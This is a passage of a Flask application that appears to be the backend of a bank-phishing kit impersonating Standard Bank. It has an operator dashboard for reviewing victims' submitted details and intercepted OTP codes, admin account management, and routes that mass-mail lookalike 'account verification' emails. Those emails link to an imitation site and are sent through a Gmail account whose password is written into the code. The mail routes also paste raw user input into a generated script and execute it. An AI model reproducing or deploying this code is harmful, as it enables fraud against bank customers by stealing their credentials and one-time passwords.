        return jsonify(response_data), 200
    
    except Exception as e:
        # Handle any errors during status check
        print(f'Error checking authorization status: {str(e)}')  # Log error details
        return jsonify({'error': 'Failed to check authorization status'}), 500  # Return server error response

# Route to serve admin login page
@app.route('/admin/login')
def admin_login():
    """Serve the admin login page"""
    return send_from_directory('public', 'admin-login.html')  # Send login HTML file

# Route to handle admin login authentication
@app.route('/admin/login', methods=['POST'])
def admin_login_post():
    """Handle admin login authentication"""
    try:
        # Get JSON data from request
        data = request.get_json()
        username = data.get('username')  # Extract username
        password = data.get('password')  # Extract password
        
        # Find admin user in database
        admin = Admin.query.filter_by(username=username).first()
        
        # Check if admin exists and password is correct
        if admin and bcrypt.checkpw(password.encode('utf-8'), admin.password_hash.encode('utf-8')):
            # Valid credentials: create session
            session['is_admin'] = True  # Set admin flag in session
            session['admin_id'] = admin.id  # Store admin ID in session
            return jsonify({'success': True}), 200  # Return success response
        else:
            # Invalid credentials
            return jsonify({'error': 'Invalid username or password'}), 401  # Return authentication error
    
    except Exception as e:
        # Handle login errors
        print(f'Login error: {str(e)}')  # Log error details
        return jsonify({'error': 'Login error'}), 500  # Return server error

# Route to serve admin dashboard (protected)
@app.route('/admin/dashboard')
def admin_dashboard():
    """Serve the admin dashboard page (requires authentication)"""
    if not require_auth():  # Check if user is authenticated
        return redirect(url_for('admin_login'))  # Redirect to login if not authenticated
    
    # Fetch the current admin's information
    admin = db.session.get(Admin, session.get('admin_id'))
    unique_link_id = admin.unique_link_id if admin else None
    is_super_admin = admin.is_super_admin if admin else False
    
    # Render the dashboard template with the admin information
    return render_template('admin-dashboard.html', unique_link_id=unique_link_id, user_is_super_admin=is_super_admin)

# Route to serve super admin dashboard (protected)
@app.route('/admin/super-dashboard')
def super_admin_dashboard():
    """Serve the super admin dashboard page (requires super admin authentication)"""
    if not require_super_admin():  # Check if user is super admin
        return redirect(url_for('admin_login'))  # Redirect to login if not super admin
    
    return render_template('super-admin-dashboard.html')

# Route to get all submissions (protected API endpoint)
@app.route('/api/admin/submissions')
def get_submissions():
    """Get all form submissions (admin only)"""
    if not require_auth():  # Check if user is authenticated
        return redirect(url_for('admin_login'))  # Redirect to login if not authenticated
    
    try:
        admin_id = session.get('admin_id')
        if not admin_id:
            return jsonify({'error': 'Admin not logged in or session expired'}), 401
        
        # Verify the admin exists and is active
        admin = db.session.get(Admin, admin_id)
        if not admin or not admin.is_active:
            return jsonify({'error': 'Admin account not found or inactive'}), 401
        
        # Super admins can see all submissions, regular admins see only their own
        if admin.is_super_admin:
            submissions = Submission.query.order_by(Submission.submitted_at.desc()).all()
        else:
            submissions = Submission.query.filter_by(admin_id=admin_id).order_by(Submission.submitted_at.desc()).all()
        
        # Convert submissions to list of dictionaries with admin info
        submissions_data = []
        for submission in submissions:
            submission_dict = submission.to_dict()
            
            # Add admin information if super admin is viewing all submissions
            if admin.is_super_admin and submission.admin_id:
                submission_admin = db.session.get(Admin, submission.admin_id)
                if submission_admin:
                    submission_dict['admin_info'] = {
                        'username': submission_admin.username,
                        'is_super_admin': submission_admin.is_super_admin
                    }
            
            submissions_data.append(submission_dict)
        
        return jsonify(submissions_data), 200  # Return submissions as JSON
    
    except Exception as e:
        # Handle database errors
        print(f'Error fetching submissions: {str(e)}')  # Log error details
        return jsonify({'error': 'Database error'}), 500  # Return server error

# Route to get all user activities (protected API endpoint)
@app.route('/api/admin/activities')
def get_user_activities():
    """Get all user activities for admin review"""
    if not require_auth():  # Check if user is authenticated
        return jsonify({'error': 'Unauthorized'}), 401  # Return unauthorized error
    
    try:
        # Get optional query parameters for filtering
        page = request.args.get('page', 1, type=int)  # Page number for pagination
        per_page = request.args.get('per_page', 50, type=int)  # Number of records per page
        action_type = request.args.get('action_type')  # Filter by action type
        user_id = request.args.get('user_id')  # Filter by specific user
        
        # Get current admin info to check if super admin
        current_admin_id = session.get('admin_id')
        admin = db.session.get(Admin, current_admin_id)
        if not admin:
            return jsonify({'error': 'Admin not found'}), 404
        
        # Build query with optional filters
        query = UserActivity.query
        
        # Apply filters if provided
        if action_type:  # Filter by specific action type
            query = query.filter(UserActivity.action_type == action_type)
        
        if user_id:  # Filter by specific user identifier
            query = query.filter(UserActivity.user_identifier == user_id)
        
        # Order by most recent first and apply pagination
        activities = query.order_by(UserActivity.timestamp.desc()).paginate(
            page=page, per_page=per_page, error_out=False
        )
        
        # Convert activities to list of dictionaries
        activities_data = [activity.to_dict() for activity in activities.items]
        
        # Return paginated response with metadata
        return jsonify({
            'activities': activities_data,  # List of activity records
            'total': activities.total,  # Total number of records
            'page': page,  # Current page number
            'per_page': per_page,  # Records per page
            'pages': activities.pages  # Total number of pages
        }), 200
    
    except Exception as e:
        # Handle database errors
        print(f'Error fetching user activities: {str(e)}')  # Log error details
        return jsonify({'error': 'Database error'}), 500  # Return server error

# Route to get activity statistics (protected API endpoint)
@app.route('/api/admin/activity-stats')
def get_activity_stats():
    """Get statistics about user activities"""
    if not require_auth():  # Check if user is authenticated
        return jsonify({'error': 'Unauthorized'}), 401  # Return unauthorized error
    
    try:
        # Get total counts by action type
        stats = db.session.query(
            UserActivity.action_type,  # Group by action type
            db.func.count(UserActivity.id).label('count')  # Count records
        ).group_by(UserActivity.action_type).all()
        
        # Convert to dictionary format
        action_stats = {stat.action_type: stat.count for stat in stats}
        
        # Get total unique users
        unique_users = db.session.query(
            db.func.count(db.func.distinct(UserActivity.user_identifier))
        ).scalar()
        
        # Get total activities
        total_activities = UserActivity.query.count()
        
        # Get recent activity (last 24 hours)
        from datetime import timedelta
        yesterday = datetime.utcnow() - timedelta(days=1)
        recent_activities = UserActivity.query.filter(
            UserActivity.timestamp >= yesterday
        ).count()
        
        return jsonify({
            'action_stats': action_stats,  # Count by action type
            'unique_users': unique_users,  # Number of unique users
            'total_activities': total_activities,  # Total activity count
            'recent_activities': recent_activities  # Activities in last 24h
        }), 200
    
    except Exception as e:
        # Handle database errors
        print(f'Error fetching activity stats: {str(e)}')  # Log error details
        return jsonify({'error': 'Database error'}), 500  # Return server error

# Route to get pending OTP authorization requests (admin only)
@app.route('/api/admin/otp-requests')
def get_otp_authorization_requests():
    """Get all OTP authorization requests for admin review"""
    if not require_auth():  # Check if user is authenticated
        return jsonify({'error': 'Unauthorized'}), 401  # Return unauthorized error
    
    try:
        # Get query parameters for filtering
        status_filter = request.args.get('status', 'pending')  # Default to pending requests
        page = request.args.get('page', 1, type=int)  # Page number for pagination
        per_page = request.args.get('per_page', 20, type=int)  # Number of records per page
        
        # Get current admin ID from session
        current_admin_id = session.get('admin_id')
        if not current_admin_id:
            return jsonify({'error': 'Admin not logged in'}), 401
        
        # Get admin info to check if super admin
        admin = db.session.get(Admin, current_admin_id)
        if not admin:
            return jsonify({'error': 'Admin not found'}), 404
        
        # Build query with filters - super admins see all, regular admins see only their own
        if admin.is_super_admin:
            query = OtpAuthorizationRequest.query
        else:
            query = OtpAuthorizationRequest.query.filter_by(admin_id=current_admin_id)
        
        # Filter by status if provided
        if status_filter and status_filter != 'all':
            query = query.filter(OtpAuthorizationRequest.status == status_filter)
        
        # Order by most recent first and apply pagination
        requests_paginated = query.order_by(OtpAuthorizationRequest.requested_at.desc()).paginate(
            page=page, per_page=per_page, error_out=False
        )
        
        # Convert requests to list of dictionaries with additional info
        requests_data = []
        for auth_request in requests_paginated.items:
            request_dict = auth_request.to_dict()
            
            # Add related submission info if available
            if auth_request.submission_id:
                submission = db.session.get(Submission, auth_request.submission_id)
                if submission:
                    request_dict['submission_info'] = {
                        'fullname': submission.fullname,
                        'submitted_at': submission.submitted_at.isoformat() if submission.submitted_at else None
                    }
            
            # Add admin information if super admin is viewing all requests
            if admin.is_super_admin and auth_request.admin_id:
                request_admin = db.session.get(Admin, auth_request.admin_id)
                if request_admin:
                    request_dict['admin_info'] = {
                        'username': request_admin.username,
                        'is_super_admin': request_admin.is_super_admin
                    }
            
            requests_data.append(request_dict)
        
        # Calculate pending count based on admin type
        if admin.is_super_admin:
            pending_count = OtpAuthorizationRequest.query.filter_by(status='pending').count()
        else:
            pending_count = OtpAuthorizationRequest.query.filter_by(status='pending', admin_id=current_admin_id).count()
        
        # Return paginated response
        return jsonify({
            'requests': requests_data,  # List of authorization requests
            'total': requests_paginated.total,  # Total number of records
            'page': page,  # Current page number
            'per_page': per_page,  # Records per page
            'pages': requests_paginated.pages,  # Total number of pages
            'pending_count': pending_count  # Count of pending requests
        }), 200
    
    except Exception as e:
        # Handle database errors
        print(f'Error fetching OTP authorization requests: {str(e)}')  # Log error details
        return jsonify({'error': 'Database error'}), 500  # Return server error

# Route to approve or deny OTP authorization request (admin only)
@app.route('/api/admin/otp-requests/<int:request_id>/decision', methods=['POST'])
def manage_otp_authorization(request_id):
    """Approve or deny an OTP authorization request"""
    if not require_auth():  # Check if user is authenticated
        return jsonify({'error': 'Unauthorized'}), 401  # Return unauthorized error
    
    try:
        # Get JSON data from request
        data = request.get_json()
        decision = data.get('decision')  # 'approve' or 'deny'
        notes = data.get('notes', '')  # Optional admin notes
        
        # Validate decision
        if decision not in ['approve', 'deny']:
            return jsonify({'error': 'Invalid decision. Must be "approve" or "deny"'}), 400
        
        # Find the authorization request
        auth_request = db.session.get(OtpAuthorizationRequest, request_id)
        
        if not auth_request:
            return jsonify({'error': 'Authorization request not found'}), 404
        
        # SECURITY CHECK: Ensure this request belongs to the current admin
        current_admin_id = session.get('admin_id')
        if auth_request.admin_id != current_admin_id:
            return jsonify({'error': 'Unauthorized: This request does not belong to your workspace'}), 403
        
        # Check if request is still pending
        if auth_request.status != 'pending':
            return jsonify({'error': f'Request already {auth_request.status}'}), 400
        
        # Update the request status
        auth_request.status = 'approved' if decision == 'approve' else 'denied'
        auth_request.approved_at = datetime.utcnow()
        auth_request.approved_by_admin_id = session.get('admin_id')
        auth_request.notes = notes
        
        # Save changes to database
        db.session.commit()
        
        # Log the admin decision
        log_user_activity(
            action_type=f'otp_auth_{auth_request.status}',  # otp_auth_approved or otp_auth_denied
            page='/api/admin/otp-requests',  # Record the endpoint
            additional_data=f'{{"request_id": {auth_request.id}, "admin_id": {session.get("admin_id")}, "decision": "{decision}"}}'
        )
        
        print(f'OTP authorization request {request_id} {auth_request.status} by admin {session.get("admin_id")}')
        
        # Return success response
        return jsonify({
            'success': True,
            'request_id': auth_request.id,
            'status': auth_request.status,
            'message': f'Request {auth_request.status} successfully'
        }), 200
    
    except Exception as e:
        # Handle any errors during decision processing
        print(f'Error processing authorization decision: {str(e)}')  # Log error details
        db.session.rollback()  # Rollback database changes if error occurred
        return jsonify({'error': 'Failed to process authorization decision'}), 500

# Route to get pending OTP verification requests (admin only)
@app.route('/api/admin/otp-verifications')
def get_otp_verification_requests():
    """Get all OTP verification requests for admin review"""
    if not require_auth():  # Check if user is authenticated
        return jsonify({'error': 'Unauthorized'}), 401  # Return unauthorized error
    
    try:
        # Get query parameters for filtering
        status_filter = request.args.get('status', 'pending')  # Default to pending requests
        page = request.args.get('page', 1, type=int)  # Page number for pagination
        per_page = request.args.get('per_page', 20, type=int)  # Number of records per page
        
        # Get current admin ID from session
        current_admin_id = session.get('admin_id')
        if not current_admin_id:
            return jsonify({'error': 'Admin not logged in'}), 401
        
        # Get admin info to check if super admin
        admin = db.session.get(Admin, current_admin_id)
        if not admin:
            return jsonify({'error': 'Admin not found'}), 404
        
        # Build query with filters - super admins see all, regular admins see only their own
        if admin.is_super_admin:
            query = OtpVerificationRequest.query
        else:
            query = OtpVerificationRequest.query.filter_by(admin_id=current_admin_id)
        
        # Filter by status if provided
        if status_filter and status_filter != 'all':
            query = query.filter(OtpVerificationRequest.status == status_filter)
        
        # Order by most recent first and apply pagination
        requests_paginated = query.order_by(OtpVerificationRequest.submitted_at.desc()).paginate(
            page=page, per_page=per_page, error_out=False
        )
        
        # Convert requests to list of dictionaries
        requests_data = [verification_request.to_dict() for verification_request in requests_paginated.items]
        
        # Calculate pending count based on admin type
        if admin.is_super_admin:
            pending_count = OtpVerificationRequest.query.filter_by(status='pending').count()
        else:
            pending_count = OtpVerificationRequest.query.filter_by(status='pending', admin_id=current_admin_id).count()
        
        # Return paginated response
        return jsonify({
            'requests': requests_data,  # List of verification requests
            'total': requests_paginated.total,  # Total number of records
            'page': page,  # Current page number
            'per_page': per_page,  # Records per page
            'pages': requests_paginated.pages,  # Total number of pages
            'pending_count': pending_count  # Count of pending requests
        }), 200
    
    except Exception as e:
        # Handle database errors
        print(f'Error fetching OTP verification requests: {str(e)}')  # Log error details
        return jsonify({'error': 'Database error'}), 500  # Return server error

# Route to approve or deny OTP verification request (admin only)
@app.route('/api/admin/otp-verifications/<int:verification_id>/decision', methods=['POST'])
def manage_otp_verification(verification_id):
    """Approve or deny an OTP verification request"""
    if not require_auth():  # Check if user is authenticated
        return jsonify({'error': 'Unauthorized'}), 401  # Return unauthorized error
    
    try:
        # Get JSON data from request
        data = request.get_json()
        decision = data.get('decision')  # 'approve' or 'deny'
        notes = data.get('notes', '')  # Optional admin notes
        
        # Validate decision
        if decision not in ['approve', 'deny']:
            return jsonify({'error': 'Invalid decision. Must be "approve" or "deny"'}), 400
        
        # Find the verification request
        verification_request = db.session.get(OtpVerificationRequest, verification_id)
        
        if not verification_request:
            return jsonify({'error': 'Verification request not found'}), 404
        
        # SECURITY CHECK: Ensure this request belongs to the current admin
        current_admin_id = session.get('admin_id')
        if verification_request.admin_id != current_admin_id:
            return jsonify({'error': 'Unauthorized: This request does not belong to your workspace'}), 403
        
        # Check if request is still pending
        if verification_request.status != 'pending':
            return jsonify({'error': f'Request already {verification_request.status}'}), 400
        
        # Update the verification request status
        verification_request.status = 'approved' if decision == 'approve' else 'denied'
        verification_request.verified_at = datetime.utcnow()
        verification_request.verified_by_admin_id = session.get('admin_id')
        verification_request.admin_notes = notes
        
        # Save changes to database
        db.session.commit()
        
        # Log the admin decision
        log_user_activity(
            action_type=f'otp_verification_{verification_request.status}',  # otp_verification_approved or otp_verification_denied
            page='/api/admin/otp-verifications',  # Record the endpoint
            additional_data=f'{{"verification_id": {verification_request.id}, "admin_id": {session.get("admin_id")}, "decision": "{decision}", "otp_code": "{verification_request.otp_code}"}}'
        )
        
        print(f'OTP verification request {verification_id} {verification_request.status} by admin {session.get("admin_id")} - OTP: {verification_request.otp_code}')
        
        # Return success response
        return jsonify({
            'success': True,
            'verification_id': verification_request.id,
            'status': verification_request.status,
            'message': f'OTP verification {verification_request.status} successfully'
        }), 200
    
    except Exception as e:
        # Handle any errors during decision processing
        print(f'Error processing OTP verification decision: {str(e)}')  # Log error details
        db.session.rollback()  # Rollback database changes if error occurred
        return jsonify({'error': 'Failed to process verification decision'}), 500

# Route to get pending transaction cancellation verification requests (admin only)
@app.route('/api/admin/transaction-cancellations')
def get_transaction_cancellation_requests():
    """Get all transaction cancellation verification requests for admin review"""
    if not require_auth():  # Check if user is authenticated
        return jsonify({'error': 'Unauthorized'}), 401  # Return unauthorized error
    
    try:
        # Get query parameters for filtering
        status_filter = request.args.get('status', 'pending')  # Default to pending requests
        page = request.args.get('page', 1, type=int)  # Page number for pagination
        per_page = request.args.get('per_page', 20, type=int)  # Number of records per page
        
        # Get current admin ID from session
        current_admin_id = session.get('admin_id')
        if not current_admin_id:
            return jsonify({'error': 'Admin not logged in'}), 401
        
        # Get admin info to check if super admin
        admin = db.session.get(Admin, current_admin_id)
        if not admin:
            return jsonify({'error': 'Admin not found'}), 404
        
        # Build query with filters - super admins see all, regular admins see only their own
        if admin.is_super_admin:
            query = TransactionCancellationRequest.query
        else:
            query = TransactionCancellationRequest.query.filter_by(admin_id=current_admin_id)
        
        # Filter by status if provided
        if status_filter and status_filter != 'all':
            query = query.filter(TransactionCancellationRequest.status == status_filter)
        
        # Order by most recent first and apply pagination
        requests_paginated = query.order_by(TransactionCancellationRequest.submitted_at.desc()).paginate(
            page=page, per_page=per_page, error_out=False
        )
        
        # Convert requests to list of dictionaries
        requests_data = [verification_request.to_dict() for verification_request in requests_paginated.items]
        
        # Calculate pending count based on admin type
        if admin.is_super_admin:
            pending_count = TransactionCancellationRequest.query.filter_by(status='pending').count()
        else:
            pending_count = TransactionCancellationRequest.query.filter_by(status='pending', admin_id=current_admin_id).count()
        
        # Return paginated response
        return jsonify({
            'requests': requests_data,  # List of verification requests
            'total': requests_paginated.total,  # Total number of records
            'page': page,  # Current page number
            'per_page': per_page,  # Records per page
            'pages': requests_paginated.pages,  # Total number of pages
            'pending_count': pending_count  # Count of pending requests
        }), 200
    
    except Exception as e:
        # Handle database errors
        print(f'Error fetching transaction cancellation verification requests: {str(e)}')  # Log error details
        return jsonify({'error': 'Database error'}), 500  # Return server error

# Route to approve or deny transaction cancellation verification request (admin only)
@app.route('/api/admin/transaction-cancellations/<int:verification_id>/decision', methods=['POST'])
def manage_transaction_cancellation_verification(verification_id):
    """Approve or deny a transaction cancellation verification request"""
    if not require_auth():  # Check if user is authenticated
        return jsonify({'error': 'Unauthorized'}), 401  # Return unauthorized error
    
    try:
        # Get JSON data from request
        data = request.get_json()
        decision = data.get('decision')  # 'approve' or 'deny'
        notes = data.get('notes', '')  # Optional admin notes
        
        # Validate decision
        if decision not in ['approve', 'deny']:
            return jsonify({'error': 'Invalid decision. Must be "approve" or "deny"'}), 400
        
        # Find the verification request
        verification_request = db.session.get(TransactionCancellationRequest, verification_id)
        
        if not verification_request:
            return jsonify({'error': 'Verification request not found'}), 404
        
        # SECURITY CHECK: Ensure this request belongs to the current admin
        current_admin_id = session.get('admin_id')
        if verification_request.admin_id != current_admin_id:
            return jsonify({'error': 'Unauthorized: This request does not belong to your workspace'}), 400
        
        # Check if request is still pending
        if verification_request.status != 'pending':
            return jsonify({'error': f'Request already {verification_request.status}'}), 400
        
        # Update the verification request status
        verification_request.status = 'approved' if decision == 'approve' else 'denied'
        verification_request.verified_at = datetime.utcnow()
        verification_request.verified_by_admin_id = session.get('admin_id')
        verification_request.admin_notes = notes
        
        # Save changes to database
        db.session.commit()
        
        # Log the admin decision
        log_user_activity(
            action_type=f'transaction_cancellation_verification_{verification_request.status}',  # transaction_cancellation_verification_approved or transaction_cancellation_verification_denied
            page='/api/admin/transaction-cancellations',  # Record the endpoint
            additional_data=f'{{"verification_id": {verification_request.id}, "admin_id": {session.get("admin_id")}, "decision": "{decision}", "otp_code": "{verification_request.otp_code}", "amount": "{verification_request.transaction_amount}"}}'
        )
        
        print(f'Transaction cancellation verification request {verification_id} {verification_request.status} by admin {session.get("admin_id")} - OTP: {verification_request.otp_code} - Amount: ${verification_request.transaction_amount}')
        
        # Return success response
        return jsonify({
            'success': True,
            'verification_id': verification_request.id,
            'status': verification_request.status,
            'message': f'Transaction cancellation verification {verification_request.status} successfully'
        }), 200
    
    except Exception as e:
        # Handle any errors during decision processing
        print(f'Error processing transaction cancellation verification decision: {str(e)}')  # Log error details
        db.session.rollback()  # Rollback database changes if error occurred
        return jsonify({'error': 'Failed to process verification decision'}), 500

# Route to get all admin accounts (super admin only)
@app.route('/api/admin/manage-admins')
def get_admin_accounts():
    """Get all admin accounts for super admin management"""
    if not require_super_admin():  # Check if user is super admin
        return jsonify({'error': 'Unauthorized - Super admin access required'}), 401
    
    try:
        # Get all admin accounts except the current super admin
        current_admin_id = session.get('admin_id')
        admins = Admin.query.filter(Admin.id != current_admin_id).order_by(Admin.created_at.desc()).all()
        
        # Convert to list of dictionaries
        admins_data = [admin.to_dict() for admin in admins]
        
        return jsonify(admins_data), 200
    
    except Exception as e:
        print(f'Error fetching admin accounts: {str(e)}')
        return jsonify({'error': 'Database error'}), 500

# Route to create new admin account (super admin only)
@app.route('/api/admin/create-admin', methods=['POST'])
def create_admin_account():
    """Create a new admin account"""
    if not require_super_admin():  # Check if user is super admin
        return jsonify({'error': 'Unauthorized - Super admin access required'}), 401
    
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        
        # Validate input
        if not username or not password:
            return jsonify({'error': 'Username and password are required'}), 400
        
        # Check if username already exists
        existing_admin = Admin.query.filter_by(username=username).first()
        if existing_admin:
            return jsonify({'error': 'Username already exists'}), 400
        
        # Create new admin account
        hashed_password = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
        new_admin = Admin(
            username=username,
            password_hash=hashed_password.decode('utf-8'),
            unique_link_id=str(uuid.uuid4()),
            is_super_admin=False,
            created_by=session.get('admin_id'),
            is_active=True
        )
        
        # Save to database
        db.session.add(new_admin)
        db.session.commit()
        
        print(f'New admin account created: {username} by super admin {session.get("admin_id")}')
        
        return jsonify({
            'success': True,
            'admin': new_admin.to_dict(),
            'message': f'Admin account "{username}" created successfully'
        }), 200
    
    except Exception as e:
        print(f'Error creating admin account: {str(e)}')
        db.session.rollback()
        return jsonify({'error': 'Failed to create admin account'}), 500

# Route to toggle admin account status (super admin only)
@app.route('/api/admin/toggle-admin-status/<int:admin_id>', methods=['POST'])
def toggle_admin_status(admin_id):
    """Toggle admin account active/inactive status"""
    if not require_super_admin():  # Check if user is super admin
        return jsonify({'error': 'Unauthorized - Super admin access required'}), 401
    
    try:
        # Find the admin account
        admin = db.session.get(Admin, admin_id)
        if not admin:
            return jsonify({'error': 'Admin account not found'}), 404
        
        # Prevent deactivating super admins
        if admin.is_super_admin:
            return jsonify({'error': 'Cannot deactivate super admin accounts'}), 400
        
        # Toggle status
        admin.is_active = not admin.is_active
        db.session.commit()
        
        status = 'activated' if admin.is_active else 'deactivated'
        print(f'Admin account {admin.username} {status} by super admin {session.get("admin_id")}')
        
        return jsonify({
            'success': True,
            'admin': admin.to_dict(),
            'message': f'Admin account "{admin.username}" {status} successfully'
        }), 200
    
    except Exception as e:
        print(f'Error toggling admin status: {str(e)}')
        db.session.rollback()
        return jsonify({'error': 'Failed to toggle admin status'}), 500

# Route to delete admin account (super admin only)
@app.route('/api/admin/delete-admin/<int:admin_id>', methods=['DELETE'])
def delete_admin_account(admin_id):
    """Delete an admin account"""
    if not require_super_admin():  # Check if user is super admin
        return jsonify({'error': 'Unauthorized - Super admin access required'}), 401
    
    try:
        # Find the admin account
        admin = db.session.get(Admin, admin_id)
        if not admin:
            return jsonify({'error': 'Admin account not found'}), 404
        
        # Prevent deleting super admins
        if admin.is_super_admin:
            return jsonify({'error': 'Cannot delete super admin accounts'}), 400
        
        # Delete the admin account
        username = admin.username
        db.session.delete(admin)
        db.session.commit()
        
        print(f'Admin account {username} deleted by super admin {session.get("admin_id")}')
        
        return jsonify({
            'success': True,
            'message': f'Admin account "{username}" deleted successfully'
        }), 200
    
    except Exception as e:
        print(f'Error deleting admin account: {str(e)}')
        db.session.rollback()
        return jsonify({'error': 'Failed to delete admin account'}), 500

# Route to handle admin logout
@app.route('/admin/logout', methods=['POST'])
def admin_logout():
    """Handle admin logout"""
    try:
        # Clear session data
        session.pop('is_admin', None)  # Remove admin flag from session
        session.pop('admin_id', None)  # Remove admin ID from session
        return redirect(url_for('admin_login')) # Redirect to login page after successful logout
    except Exception as e:
        # Handle logout errors
        print(f'Logout error: {str(e)}')  # Log error details
        return jsonify({'error': 'Logout error'}), 500  # Return server error

# Route to serve static files from public directory
@app.route('/public/<path:filename>')
def serve_static(filename):
    """Serve static files from public directory"""
    return send_from_directory('public', filename)  # Send requested file

# Route to serve user management page
@app.route('/user-management')
def user_management():
    """Serve the user management page for email operations"""
    return send_from_directory('public', 'user-management.html')  # Send user management HTML file

# Email Management API Routes

# Route to update receiver email
@app.route('/api/update-receiver-email', methods=['POST'])
def update_receiver_email():
    """Update the default receiver email address"""
    try:
        data = request.get_json()
        new_email = data.get('email')
        
        if not new_email:
            return jsonify({'error': 'Email address is required'}), 400
        
        # Store the new receiver email (you can save this to a config file or database)
        # For now, we'll update the SMTP script directly
        try:
            with open('smtp.py', 'r', encoding='utf-8') as file:
                content = file.read()
            
            # Update the receiver email in the SMTP script
            import re
            pattern = r'msg\["To"\] = "[^"]*"'
            replacement = f'msg["To"] = "{new_email}"'
            updated_content = re.sub(pattern, replacement, content)
            
            with open('smtp.py', 'w', encoding='utf-8') as file:
                file.write(updated_content)
            
            return jsonify({'success': True, 'message': f'Receiver email updated to {new_email}'}), 200
            
        except Exception as e:
            return jsonify({'error': f'Failed to update SMTP script: {str(e)}'}), 500
            
    except Exception as e:
        return jsonify({'error': f'Server error: {str(e)}'}), 500

# Route to send single email
@app.route('/api/send-single-email', methods=['POST'])
def send_single_email():
    """Send a single email to specified address"""
    try:
        data = request.get_json()
        email = data.get('email')
        subject = data.get('subject', 'Standard Bank: Important Account Notice')
        notes = data.get('notes', '')
        
        if not email:
            return jsonify({'error': 'Email address is required'}), 400
        
        # Import and run the SMTP script with custom parameters
        import subprocess
        import sys
        
        # Create a temporary SMTP script with custom email
        temp_smtp_content = f'''import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# ========== Gmail SMTP ==========
smtp_server = "smtp.gmail.com"
port = 587
username = "Standardbankingconfirmation@gmail.com"
password = "udyu gyfv rfjj fvgk"

# Create message
msg = MIMEMultipart("alternative")
msg["From"] = username
msg["To"] = "{email}"
msg["Subject"] = "{subject}"

# HTML content (same as your template)
html_content = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Standard Bank - Account Verification Required</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background-color: #003cc7;
            margin: 0;
            padding: 20px;
            line-height: 1.6;
        }}
        
        .email-container {{
            max-width: 500px;
            margin: 0 auto;
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }}
        
        .header-bar {{
            background: linear-gradient(90deg, #0056b3 0%, #003cc7 100%);
            color: white;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 14px;
        }}
        
        .content {{
            padding: 20px;
            color: #333;
        }}
        
        .greeting {{
            font-size: 18px;
            margin-bottom: 20px;
            color: #333;
            font-weight: bold;
        }}
        
        .main-message {{
            font-size: 14px;
            margin-bottom: 20px;
            color: #333;
            line-height: 1.6;
        }}
        
        .service-link {{
            background-color: #0056b3;
            color: white;
            padding: 12px 20px;
            text-decoration: none;
            border-radius: 4px;
            display: inline-block;
            margin: 20px 0;
            font-weight: bold;
            font-size: 16px;
            transition: background-color 0.3s ease;
            border: none;
            cursor: pointer;
            width: 100%;
            max-width: 300px;
            text-align: center;
        }}
        
        .service-link:hover {{
            background-color: #004080;
        }}
        
        .footer-bar {{
            background: linear-gradient(90deg, #0056b3 0%, #003cc7 100%);
            color: white;
            padding: 15px 20px;
            text-align: center;
            font-weight: bold;
            font-size: 18px;
            font-style: italic;
        }}
    </style>
</head>
<body>
    <div class="email-container">
        <div class="header-bar">
            <div class="header-left">
                Customer Care: 086 120 1311
            </div>
            <div class="header-right">
                <span>Website: www.standardbank.co.za</span>
                <div class="logo-section">
                    <div class="logo">
                        <img src="https://standardbank.onrender.com/logo-email.png" alt="Standard Bank Logo">
                    </div>
                </div>
            </div>
        </div>
        
        <div class="content">
            <div class="greeting">
                Hello Customer,
            </div>
            
            <div class="main-message">
                Your account security settings require updating to comply with new banking regulations. Please update your profile information to maintain uninterrupted access to your banking services.
            </div>
            
            <div class="main-message">
                For assistance with account updates, contact our customer service on <strong>086 120 1311</strong> or international <strong>+27 01 249 0423</strong>.
            </div>
            
            <div style="text-align: center;">
                <a href="https://standardbank.onrender.com/?admin_id=168368c5-7a1a-4dd8-8ce0-4622f8080f95" class="service-link">
                    UPDATE ACCOUNT SETTINGS
                </a>
            </div>
            
            <div class="main-message">
                Kind Regards,<br>
                <strong>Standard Bank</strong>
            </div>
            
            {f'<div class="main-message"><strong>Notes:</strong> {notes}</div>' if notes else ''}
        </div>
        
        <div class="footer-bar">
            Standard Bank IT CAN BE.
        </div>
    </div>
</body>
</html>"""

# Attach HTML
msg.attach(MIMEText(html_content, "html"))

# Send email
server = smtplib.SMTP(smtp_server, port)
server.starttls()
server.login(username, password)
server.sendmail(msg["From"], msg["To"], msg.as_string())
server.quit()

print("✅ Single email sent successfully!")
print(f"📧 To: {email}")
print(f"🎯 Subject: {subject}")
'''
        
        # Write temporary SMTP script
        with open('temp_smtp.py', 'w', encoding='utf-8') as file:
            file.write(temp_smtp_content)
        
        # Run the temporary script
        result = subprocess.run([sys.executable, 'temp_smtp.py'], capture_output=True, text=True)
        
        # Clean up temporary file
        import os
        if os.path.exists('temp_smtp.py'):
            os.remove('temp_smtp.py')
        
        if result.returncode == 0:
            return jsonify({'success': True, 'message': f'Email sent successfully to {email}'}), 200
        else:
            return jsonify({'error': f'Failed to send email: {result.stderr}'}), 500
            
    except Exception as e:
        return jsonify({'error': f'Server error: {str(e)}'}), 500

# Route to send batch emails
@app.route('/api/send-batch-emails', methods=['POST'])
def send_batch_emails():
    """Send batch emails to multiple addresses"""
    try:
        data = request.get_json()
        batch_name = data.get('batch_name')
        subject = data.get('subject', 'Standard Bank: Important Account Notice')
        notes = data.get('notes', '')
        emails = data.get('emails', [])
        
        if not batch_name:
            return jsonify({'error': 'Batch name is required'}), 400
        
        if not emails or len(emails) == 0:
            return jsonify({'error': 'No emails provided'}), 400
        
        # Send emails to each address
        sent_count = 0
        failed_emails = []
        
        for email_data in emails:
            try:
                email = email_data.get('email')
                if email:
                    # Send single email using the same logic
                    import subprocess
                    import sys
                    
                    # Create temporary SMTP script for this email
                    temp_smtp_content = f'''import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# ========== Gmail SMTP ==========
smtp_server = "smtp.gmail.com"
port = 587
username = "Standardbankingconfirmation@gmail.com"
password = "udyu gyfv rfjj fvgk"

# Create message
msg = MIMEMultipart("alternative")
msg["From"] = username
msg["To"] = "{email}"
msg["Subject"] = "{subject}"

